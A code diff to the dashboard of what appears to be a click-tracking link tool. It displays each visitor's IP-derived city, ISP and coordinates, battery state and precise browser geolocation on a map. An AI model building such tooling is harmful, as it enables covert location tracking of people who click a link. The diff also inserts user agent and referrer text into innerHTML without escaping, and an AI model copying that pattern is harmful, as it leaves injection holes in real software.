@@ -6,14 +6,14 @@ function initMap(lat, lon) {
     map = L.map('map').setView([lat || 0, lon || 0], lat ? 13 : 2);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OpenStreetMap contributors' }).addTo(map);
   }
-  if (lat && lon) {
+  if (lat != null && lon != null) {
     if (marker) marker.setLatLng([lat, lon]); else marker = L.marker([lat, lon]).addTo(map);
-    map.setView([lat, lon], 13);
+    map.setView([lat, lon], lat === 0 && lon === 0 ? 2 : 13);
   }
 }
 
 const isLocalDevServer = location.protocol === 'file:' || (['localhost', '127.0.0.1', '0.0.0.0'].includes(location.hostname) && location.port && location.port !== '3000');
-const API_BASE = isLocalDevServer ? 'http://localhost:3000' : '';
+const API_BASE = isLocalDevServer ? 'http://127.0.0.1:3000' : '';
 
 function getQueryParam(name) {
   return new URLSearchParams(window.location.search).get(name);
@@ -47,7 +47,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const formatLocation = (location) => {
       if (!location || typeof location.latitude !== 'number' || typeof location.longitude !== 'number') return 'Not available';
       const accuracy = location.accuracy != null ? ` ±${location.accuracy}m` : '';
-      return `${location.latitude.toFixed(4)}, ${location.longitude.toFixed(4)}${accuracy}`;
+      return `${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}${accuracy}`;
     };
 
     let foundCoords = null;
@@ -64,14 +64,32 @@ document.addEventListener('DOMContentLoaded', () => {
 
         const when = document.createElement('div');
         when.className = 'clickTime';
-        when.textContent = c.at || 'Unknown timestamp';
+        when.textContent = new Date(c.at).toLocaleString();
 
         const meta = document.createElement('div');
         meta.className = 'clickMeta';
+        
+        let ipInfoHtml = `<div><strong>IP:</strong> ${c.ip || 'Unknown'}</div>`;
+        if (c.ipDetails) {
+          const locColor = c.ipDetails.isLocal ? '#ffcc00' : '#35ff9e';
+          ipInfoHtml += `
+            <div style="color: ${locColor}; font-weight: bold; font-size: 1.1em; margin: 4px 0;">
+              📍 ${c.ipDetails.city || '?'}, ${c.ipDetails.country || '?'}
+            </div>
+            <div><strong>ISP:</strong> ${c.ipDetails.org || '?'}</div>
+            <div style="font-family: monospace; background: rgba(0,255,120,0.1); padding: 2px 6px; border-radius: 4px; display: inline-block; margin-top: 4px;">
+              LAT: ${c.ipDetails.latitude} | LON: ${c.ipDetails.longitude}
+            </div>
+          `;
+          if (!foundCoords || !c.ipDetails.isLocal) {
+            foundCoords = { latitude: c.ipDetails.latitude, longitude: c.ipDetails.longitude };
+          }
+        }
+
         meta.innerHTML = `
-          <div><strong>IP:</strong> ${c.ip || 'Unknown'}</div>
-          <div><strong>UA:</strong> ${c.ua || c.client?.ua || 'Unknown'}</div>
-          <div><strong>Referrer:</strong> ${c.ref || '-'}</div>
+          ${ipInfoHtml}
+          <div style="margin-top: 8px; font-size: 0.85em; opacity: 0.8;"><strong>UA:</strong> ${c.ua || c.client?.ua || 'Unknown'}</div>
+          <div style="font-size: 0.85em; opacity: 0.8;"><strong>Referrer:</strong> ${c.ref || '-'}</div>
         `;
 
         li.appendChild(when);
@@ -80,16 +98,20 @@ document.addEventListener('DOMContentLoaded', () => {
         if (c.client) {
           const clientInfo = document.createElement('div');
           clientInfo.className = 'clickClient';
+          clientInfo.style.borderTop = '1px solid rgba(0,255,120,0.1)';
+          clientInfo.style.marginTop = '10px';
+          clientInfo.style.paddingTop = '10px';
+          
           const batteryText = c.client.battery ? `${Math.round((c.client.battery.level || 0) * 100)}% ${c.client.battery.charging ? '(charging)' : '(not charging)'}` : 'Not available';
           const locationText = formatLocation(c.client.location);
 
           clientInfo.innerHTML = `
             <div><strong>Battery:</strong> ${batteryText}</div>
-            <div><strong>Location:</strong> ${locationText}</div>
+            <div style="color: #35ff9e;"><strong>Browser Geolocation:</strong> ${locationText}</div>
           `;
           li.appendChild(clientInfo);
 
-          if (c.client.location && !foundCoords) {
+          if (c.client.location) {
             foundCoords = c.client.location;
           }
         }
@@ -99,16 +121,28 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     if (allClicks.length) {
-      const latestClientClick = allClicks.slice().reverse().find(c => c.client);
-      if (latestClientClick) {
-        const batteryText = latestClientClick.client.battery ? `${Math.round((latestClientClick.client.battery.level || 0) * 100)}% ${latestClientClick.client.battery.charging ? '(charging)' : '(not charging)'}` : 'Not available';
-        const locationText = formatLocation(latestClientClick.client.location);
-        deviceInfo.innerHTML = `
-          <p><strong>Latest client:</strong> ${latestClientClick.client.ua || 'Unknown'}</p>
-          <p><strong>Battery:</strong> ${batteryText}</p>
-          <p><strong>Location:</strong> ${locationText}</p>
+      const latestClick = allClicks[allClicks.length - 1];
+      let summaryHtml = `<p><strong>Latest IP:</strong> ${latestClick.ip || 'Unknown'}</p>`;
+      
+      if (latestClick.ipDetails) {
+        summaryHtml += `
+          <p style="font-size: 1.2em; color: #35ff9e;"><strong>📍 ${latestClick.ipDetails.city}, ${latestClick.ipDetails.country}</strong></p>
+          <p><strong>ISP:</strong> ${latestClick.ipDetails.org}</p>
+          <p style="font-family: monospace;"><strong>Coords:</strong> ${latestClick.ipDetails.latitude}, ${latestClick.ipDetails.longitude}</p>
         `;
       }
+      
+      if (latestClick.client) {
+        const batteryText = latestClick.client.battery ? `${Math.round((latestClick.client.battery.level || 0) * 100)}% ${latestClick.client.battery.charging ? '(charging)' : '(not charging)'}` : 'Not available';
+        const locationText = formatLocation(latestClick.client.location);
+        summaryHtml += `
+          <hr style="border: 0; border-top: 1px solid rgba(0,255,120,0.2); margin: 10px 0;">
+          <p><strong>Battery:</strong> ${batteryText}</p>
+          <p><strong>Browser Geo:</strong> ${locationText}</p>
+        `;
+      }
+      
+      deviceInfo.innerHTML = summaryHtml;
     }
 
     initMap(foundCoords?.latitude, foundCoords?.longitude);
